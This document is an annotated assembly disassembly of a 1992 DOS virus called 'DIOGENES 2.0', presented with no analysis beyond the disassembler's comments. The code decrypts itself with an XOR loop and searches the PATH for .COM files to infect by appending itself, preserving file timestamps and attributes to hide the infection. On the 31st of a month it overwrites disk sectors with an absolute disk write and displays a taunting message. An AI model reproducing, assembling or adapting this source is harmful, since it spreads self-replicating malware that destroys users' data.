

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        DIOSHIT				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   4-Oct-92					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: none	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e		equ	2Ch			; (38D6:002C=0)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
dioshit		proc	far
  
start:
		jmp	loc_1			; (0106)
		db	 00h,0CDh, 21h
loc_1:
		call	sub_1			; (0109)
  
dioshit		endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		pop	bp
		nop
		sub	bp,107h
		nop
		call	sub_8			; (0444)
		lea	si,[bp+2E2h]		; Load effective addr
		mov	di,offset ds:[100h]	; (38D6:0100=0E9h)
		push	di
		movsw				; Mov [si] to es:[di]
		movsb				; Mov [si] to es:[di]
		mov	di,bp
		mov	bp,sp
		sub	sp,80h
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		push	bx
		mov	ah,1Ah
		lea	dx,[bp-80h]		; Load effective addr
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		cmp	dl,1Fh
		je	loc_2			; Jump if equal
		jmp	short loc_3		; (015B)
		db	90h
loc_2:
		pushf				; Push flags
		mov	al,2
		mov	cx,2CEh
		mov	dx,1
		mov	bx,offset data_8	; (38D6:02E8=3)
		int	26h			; Absolute disk write, drive al
		popf				; Pop flags
		mov	ah,9
		mov	dx,offset data_8	; (38D6:02E8=3)
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		jmp	short $+3		; delay for I/O
		nop
		mov	ax,4C00h
		int	21h			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
loc_3:
		call	sub_2			; (0174)
		pop	dx
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		mov	sp,bp
		xor	ax,ax			; Zero register
		mov	bx,ax
		mov	cx,ax
		mov	dx,ax
		mov	si,ax
		mov	di,ax
		mov	bp,ax
		retn
sub_1		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_2		proc	near
		mov	bx,di
		push	bp
		mov	bp,sp
		sub	sp,87h
		mov	byte ptr [bp-87h],5Ch	; '\'
		mov	ah,47h			; 'G'
		xor	dl,dl			; Zero register
		lea	si,[bp-86h]		; Load effective addr
		int	21h			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
		call	sub_3			; (01D4)
loc_4:
		cmp	data_3[bx],0		; (38D6:01FA=3D48h)
		je	loc_5			; Jump if equal
		call	sub_4			; (0200)
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		xor	al,al			; Zero register
		stosb				; Store al to es:[di]
		mov	ah,3Bh			; ';'
		lea	dx,[bp-46h]		; Load effective addr
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		lea	dx,[bx+1CCh]		; Load effective addr
		push	di
		mov	di,bx
		call	sub_5			; (021D)
		mov	bx,di
		pop	di
		jnc	loc_5			; Jump if carry=0
		jmp	short loc_4		; (018F)
loc_5:
		mov	ah,3Bh			; ';'
		lea	dx,[bp-87h]		; Load effective addr
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		cmp	data_3[bx],0		; (38D6:01FA=3D48h)
		jne	loc_6			; Jump if not equal
		stc				; Set carry flag
loc_6:
		mov	sp,bp
		pop	bp
		retn
sub_2		endp
  
		db	 2Ah, 2Eh, 43h, 4Fh, 4Dh, 00h
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_3		proc	near
		mov	es,cs:data_1e		; (38D6:002C=0)
		xor	di,di			; Zero register
loc_7:
		lea	si,[bx+1F5h]		; Load effective addr
		lodsb				; String [si] to al
		mov	cx,8000h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,4
  
locloop_8:
		lodsb				; String [si] to al
		scasb				; Scan es:[di] for al
		jnz	loc_7			; Jump if not zero
		loop	locloop_8		; Loop if cx > 0
  
		mov	data_3[bx],di		; (38D6:01FA=3D48h)
		mov	word ptr data_3+2[bx],es	; (38D6:01FC=0)
		retn
sub_3		endp
  
		db	 50h, 41h, 54h
data_3		dw	3D48h, 0		; Data table (indexed access)
		db	0, 0
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_4		proc	near
		lds	si,dword ptr data_3[bx]	; (38D6:01FA=3D48h) Load 32 bit ptr
		lea	di,[bp-46h]		; Load effective addr
		push	cs
		pop	es
loc_9:
		lodsb				; String [si] to al
		cmp	al,3Bh			; ';'
		je	loc_11			; Jump if equal
		or	al,al			; Zero ?
		jz	loc_10			; Jump if zero
		stosb				; Store al to es:[di]
		jmp	short loc_9		; (0209)
loc_10:
		xor	si,si			; Zero register
loc_11:
		mov	es:data_3[bx],si	; (38D6:01FA=3D48h)
		retn
sub_4		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5		proc	near
		push	bp
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		push	bx
		mov	bp,sp
		sub	sp,80h
		push	dx
		mov	ah,1Ah
		lea	dx,[bp-80h]		; Load effective addr
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		mov	ah,4Eh			; 'N'
		mov	cx,27h
		pop	dx
loc_12:
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jc	loc_13			; Jump if carry Set
		call	sub_6			; (024D)
		jnc	loc_13			; Jump if carry=0
		mov	ah,4Fh			; 'O'
		jmp	short loc_12		; (0237)
loc_13:
		mov	sp,bp
		mov	ah,1Ah
		pop	dx
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		pop	bp
		retn
sub_5		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6		proc	near
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	si,bx
		mov	byte ptr ds:[2E1h][di],0	; (38D6:02E1=1)
		cmp	word ptr [si+1Ah],0FBB1h
		jbe	loc_14			; Jump if below or =
		jmp	short loc_15		; (02DD)
		db	90h
loc_14:
		mov	ax,3D00h
		lea	dx,[si+1Eh]		; Load effective addr
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		xchg	ax,bx
		mov	ah,3Fh			; '?'
		mov	cx,3
		lea	dx,[di+2E2h]		; Load effective addr
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		mov	ax,4202h
		cwd				; Word to double word
		mov	cx,dx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		xchg	ax,dx
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		xchg	ax,dx
		sub	ax,351h
		cmp	data_6[di],ax		; (38D6:02E3=0B401h)
		je	loc_15			; Jump if equal
		mov	byte ptr ds:[2E1h][di],1	; (38D6:02E1=1)
		add	ax,34Eh
		mov	data_7[di],ax		; (38D6:02E6=0E9B0h)
		mov	ax,4301h
		xor	cx,cx			; Zero register
		lea	dx,[si+1Eh]		; Load effective addr
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		xchg	ax,bx
		mov	ah,40h			; '@'
		mov	cx,3
		lea	dx,[di+2E5h]		; Load effective addr
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ax,4202h
		cwd				; Word to double word
		mov	cx,dx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		push	si
;*		call	sub_7			;*(03FB)
		db	0E8h, 3Bh, 01h
		pop	si
		mov	ax,5701h
		mov	cx,[si+16h]
		mov	dx,[si+18h]
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	ax,4301h
		xor	ch,ch			; Zero register
		mov	cl,[si+15h]
		lea	dx,[si+1Eh]		; Load effective addr
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_15:
		cmp	byte ptr ds:[2E1h][di],1	; (38D6:02E1=1)
		retn
sub_6		endp
  
data_6		dw	0B401h			; Data table (indexed access)
		db	4Ch
data_7		dw	0E9B0h			; Data table (indexed access)
data_8		db	3, 0
		db	0Dh, 0Ah, '  DIOGENES 2.0 has vis'
		db	'ited your hard drive.....', 0Dh, 0Ah
		db	0Dh, 0Ah, '  This has been anothe'
		db	'r fine product of the Lehigh Val'
		db	'ley.', 0Dh, 0Ah, '  Watch (out) '
		db	'for future ', 27h, 'upgrades', 27h
		db	'.', 0Dh, 0Ah, 0Dh, 0Ah, '  The w'
		db	'orld', 27h, 's deceit has raped '
		db	'my soul.  We melt the plastic', 0Dh
		db	0Ah, '  people down, then we melt'
		db	' thier plastic town.....', 0Dh, 0Ah
		db	'$'
		db	0Dh, 0Ah, 0Dh, 0Ah, 'U'
		db	 8Bh,0EFh, 8Dh,0B6h, 42h, 04h
		db	 32h,0E4h,0CDh, 1Ah, 89h, 54h
		db	 09h, 80h, 74h, 01h, 08h, 80h
		db	 74h, 08h, 01h, 81h, 74h, 0Bh
		db	 01h, 01h, 8Dh,0BEh, 52h, 04h
		db	0B9h, 0Fh, 00h, 56h, 51h,0F3h
		db	0A4h, 8Dh,0B6h, 3Dh, 04h,0B9h
		db	 05h, 00h,0F3h,0A4h, 59h, 5Eh
		db	 41h,0F3h,0A4h,0B4h, 40h, 8Dh
		db	 96h, 04h, 01h, 8Dh,0B6h, 52h
		db	 04h,0FFh,0D6h, 8Bh,0FDh, 5Dh
		db	0C3h,0B9h, 4Eh, 03h,0CDh
		db	21h
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_8		proc	near
		lea	di,[bp+111h]		; Load effective addr
		mov	cx,198h
  
locloop_16:
		xor	word ptr [di],0EA12h
		inc	di
		inc	di
		loop	locloop_16		; Loop if cx > 0
  
		retn
sub_8		endp
  
  
seg_a		ends
  
  
  
		end	start

